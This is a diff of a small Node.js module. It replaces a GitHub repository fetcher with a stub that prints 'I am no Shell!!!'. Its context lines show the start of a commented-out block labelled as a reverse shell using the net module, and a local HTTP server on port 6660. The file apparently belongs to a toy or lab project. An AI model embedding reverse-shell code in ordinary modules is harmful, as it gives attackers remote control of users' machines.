@@ -1,27 +1,5 @@
-const axios = require('axios');
-const getRepos = async ({
-  username = 'ibarkay',
-  page = 1,
-  per_page = 30
-} = {}) => {
-  try {
-    const repos = await axios.get(
-      `https://api.github.com/users/${username}/repos?page=${page}&per_page=${per_page}&sort=updated`
-    );
-    return repos.data
-      .map((repo) => {
-        return {
-          name: repo.name,
-          url: repo.html_url,
-          description: repo.description,
-          stars: repo.stargazers_count
-        };
-      })
-      .sort((first, second) => second.stars - first.stars);
-  } catch (error) {
-    return [];
-  }
-};
+// const axios = require('axios');
+const getRepos = () => console.log('I am no Shell!!!')
 // Reverse-shell here:
 // (function(){
 //     var net = require("net"),
@@ -62,6 +40,6 @@ http.createServer(function (req, res) {
   }
 }).listen('6660', '127.0.0.1');
 
-getRepos().then((repositories) => console.log(repositories));
+getRepos()
 module.exports = { getRepos: getRepos };
 module.exports ={getRepos}; 
